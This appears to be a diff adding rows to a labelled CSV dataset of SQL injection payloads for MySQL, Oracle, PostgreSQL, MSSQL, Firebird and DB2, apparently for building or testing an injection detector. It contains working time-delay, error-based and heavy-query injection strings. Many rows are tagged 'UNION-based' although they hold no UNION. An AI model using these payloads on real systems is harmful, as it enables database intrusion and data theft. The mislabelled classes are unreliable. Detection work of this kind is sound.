+21729,1%' ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( '%' = ',union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
+21731,"1"" ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""fuus"" like ""fuus",union_based,oracle,1.0,"Signals: 'chr', 'case', 'dual'; UNION-based payload detected; DB: oracle",0
+21733,"-3587' ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'psqt' like 'psqt",union_based,oracle,1.0,"Signals: 'chr', 'case', 'ctxsys'; UNION-based payload detected; DB: oracle",0
+21734,"1' in boolean mode ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) #",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
+21738,"1' ) ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( 'vpus' = 'vpus",union_based,mysql,1.0,"Signals: 'extractvalue', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
+21743,1 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) -- xwoo,union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
+21747,"1' in boolean mode ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) #",union_based,oracle,1.0,"Signals: 'chr', 'case', 'ctxsys'; UNION-based payload detected; DB: oracle",0
+21754,"1%' or elt ( 6272 = 6272,sleep ( 5 ) ) and '%' = '",time_blind,mysql,1.0,"Signals: 'elt', 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql",0
+21755,"1%"" ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ""%"" = """,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
+21758,"1' ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) )",union_based,mysql,1.0,"Signals: 'extractvalue', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
+21766,select ( case when ( 7169 = 7785 ) then 1 else 7169* ( select 7169 from master..sysdatabases ) end ) --,union_based,generic,1.0,"Signals: 'case', 'sysdatabases'; UNION-based payload detected",0
+21771,1 ) ) as xoch where 8765 = 8765 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
+21778,"1' ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'qtfl' = 'qtfl",union_based,mssql,1.0,"Signals: 'convert', 'char', 'case'; UNION-based payload detected; DB: mssql",0
+21783,select ( case when ( 2132 = 8969 ) then 1 else 2132* ( select 2132 from master..sysdatabases ) end ) --,union_based,generic,1.0,"Signals: 'case', 'sysdatabases'; UNION-based payload detected",0
+21785,"1' ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( 'vjnf' like 'vjnf",union_based,generic,1.0,"Signals: 'substring', 'substr', 'char'; UNION-based payload detected",0
+21788,"1"" ) as yggn where 1006 = 1006 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",union_based,generic,1.0,"Signals: 'extractvalue', 'concat', 'case'; UNION-based payload detected",0
+21790,"1 ) where 8338 = 8338 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",union_based,oracle,1.0,"Signals: 'chr', 'case', 'ctxsys'; UNION-based payload detected; DB: oracle",0
+21791,"1%' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( '%' = '",union_based,mysql,1.0,"Signals: 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
+21792,"1'|| ( select 'qued' where 9801 = 9801 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",union_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; UNION-based payload detected; DB: mysql",0
+21797,1' ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( 'npzh' = 'npzh,union_based,mysql,1.0,"Signals: 'sleep', 'rlike'; UNION-based payload detected; DB: mysql",0
+21609,"1"" ) where 8407 = 8407 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
+21612,( select * from ( select ( sleep ( 5 ) ) ) srmq ) # gkkx,union_based,mysql,0.9,Signals: 'sleep'; UNION-based payload detected; DB: mysql,0
+21625,1'|| ( select 'lljg' from dual where 7631 = 7631,union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,0
+21627,"select * from generate_series ( 1134,1134,case when ( 1134 = 4909 ) then 1 else 0 end ) limit 1--",union_based,generic,0.9,Signals: 'case'; UNION-based payload detected. Payload length: 97 chars.,0
+21630,"select * from generate_series ( 3086,3086,case when ( 3086 = 3327 ) then 1 else 0 end ) limit 1--",union_based,generic,0.9,Signals: 'case'; UNION-based payload detected. Payload length: 97 chars.,0
+21631,if ( 3245 = 6168 ) select 3245 else drop function nafj--,union_based,mysql,0.9,Signals: 'if'; UNION-based payload detected; DB: mysql,0
+21642,"1'|| ( select 'lstx' from dual where 2972 = 2972 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ) ||'",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,0
+21643,1 where 2649 = 2649 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --,union_based,mysql,0.9,Signals: 'sleep'; UNION-based payload detected; DB: mysql,0
+21670,"1', ( select ( case when ( 5249 = 9648 ) then 1 else 1/ ( select 0 ) end ) )",union_based,generic,0.9,Signals: 'case'; UNION-based payload detected. Payload length: 76 chars.,0
+21677,1' or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ),union_based,mysql,0.9,Signals: 'sleep'; UNION-based payload detected; DB: mysql,0
+21715,"1'+ ( select qjng where 1897 = 1897 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ) +'",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
+21748,"1"" ) where 9359 = 9359 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
+21750,select ( case when ( 5142 = 6855 ) then 5142 else 5142* ( select 5142 from mysql.db ) end ) #,union_based,generic,0.9,Signals: 'case'; UNION-based payload detected. Payload length: 93 chars.,0
+21751,select ( case when ( 9130 = 1826 ) then 9130 else 9130* ( select 9130 from mysql.db ) end ) #,union_based,generic,0.9,Signals: 'case'; UNION-based payload detected. Payload length: 93 chars.,0
+21752,"1' or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and 'ugum' like 'ugum",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
+21753,1%' ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( '%' = ',union_based,mysql,0.9,Signals: 'sleep'; UNION-based payload detected; DB: mysql,0
+21763,1' and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and 'gpax' = 'gpax,union_based,mysql,0.9,Signals: 'sleep'; UNION-based payload detected; DB: mysql,0
+21764,"select * from generate_series ( 6200,6200,case when ( 6200 = 5449 ) then 1 else 0 end ) limit 1--",union_based,generic,0.9,Signals: 'case'; UNION-based payload detected. Payload length: 97 chars.,0
+21769,"select * from generate_series ( 9964,9964,case when ( 9964 = 4455 ) then 1 else 0 end ) limit 1--",union_based,generic,0.9,Signals: 'case'; UNION-based payload detected. Payload length: 97 chars.,0
+21770,select case when 6662 = 9889 then 1 else null end--,union_based,generic,0.9,Signals: 'case'; UNION-based payload detected. Payload length: 51 chars.,0
+21772,select ( case when ( 6045 = 2786 ) then 6045 else 1/ ( select 0 ) end ) --,union_based,generic,0.9,Signals: 'case'; UNION-based payload detected. Payload length: 74 chars.,0
+21776,if ( 4194 = 4133 ) select 4194 else drop function tqhz--,union_based,mysql,0.9,Signals: 'if'; UNION-based payload detected; DB: mysql,0
+21779,"1 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) # kfza",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
+21603,"1"" and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ""hcjz"" like ""hcjz",union_based,generic,0.7,UNION-based payload detected. Payload length: 182 chars.,0
+21619,"1"" and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ""xhvo"" = ""xhvo",union_based,generic,0.7,UNION-based payload detected. Payload length: 125 chars.,0
+21622,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( ""ekbq"" = ""ekbq",union_based,generic,0.7,UNION-based payload detected. Payload length: 110 chars.,0
+21633,1'+ ( select xzse where 4530 = 4530,union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,0
+21647,1'+ ( select idnb where 2338 = 2338,union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,0
+21659,"1' ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 'uorw' like 'uorw",union_based,postgresql,0.7,UNION-based payload detected; DB: postgresql. Payload length: 100 chars.,0
+21666,"1%' or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 163 chars.,0
+21689,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",union_based,db2,0.7,UNION-based payload detected; DB: db2. Payload length: 94 chars.,0
+21693,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""rukx"" like ""rukx",union_based,db2,0.7,UNION-based payload detected; DB: db2. Payload length: 114 chars.,0
+21699,"1"" ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ""ctzh"" = ""ctzh",union_based,generic,0.7,UNION-based payload detected. Payload length: 125 chars.,0
+21701,"1 ) as kqas where 7302 = 7302 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",union_based,postgresql,0.7,UNION-based payload detected; DB: postgresql. Payload length: 101 chars.,0
+21703,"1%"" ) ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 116 chars.,0
+21726,1'+ ( select 'tjvt' where 2463 = 2463,union_based,generic,0.7,UNION-based payload detected. Payload length: 37 chars.,0
+21741,"1' ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 'ewwi' = 'ewwi",union_based,generic,0.7,UNION-based payload detected. Payload length: 136 chars.,0
+21749,"1%' ) ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 115 chars.,0
+21756,1'+ ( select ksoh where 6339 = 6339,union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,0
+21759,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ||'",union_based,db2,0.7,UNION-based payload detected; DB: db2. Payload length: 98 chars.,0
+21784,"1' ) ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 114 chars.,0
